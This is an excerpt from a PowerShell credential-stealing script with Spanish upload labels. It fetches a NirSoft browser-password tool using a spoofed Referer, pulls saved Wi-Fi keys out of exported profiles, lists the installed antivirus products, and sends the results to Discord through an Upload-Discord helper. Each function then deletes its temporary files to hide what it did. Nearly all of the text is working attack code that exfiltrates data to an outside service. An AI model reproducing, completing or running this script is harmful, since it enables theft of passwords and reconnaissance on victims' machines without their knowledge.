...
function Get-Nirsoft {
    mkdir \temp -Force
    cd \temp
    Invoke-WebRequest -Headers @{'Referer' = 'https://www.nirsoft.net/utils/web_browser_password.html'} `
...
function Wifi {
    ...
    Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} `
        | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} `
        | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
    Upload-Discord -file "$desktop\0.txt" -text "Contraseñas Wi-Fi:"
    Set-Location -Path "$env:temp"
    Remove-Item -Path "$env:temp/js2k3kd4nne5dhsk" -Force -Recurse
    Remove-Item -Path $desktop\0.txt
}
...
function version-av {
    ...
    Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct `
        | Out-File -FilePath C:\Temp\resultat.txt -Encoding utf8
    Upload-Discord -file "C:\Temp\resultat.txt" -text "Versión del Anti-Spyware:"
    cd C:\
    Remove-Item -Path \temp -Force -Recurse
}
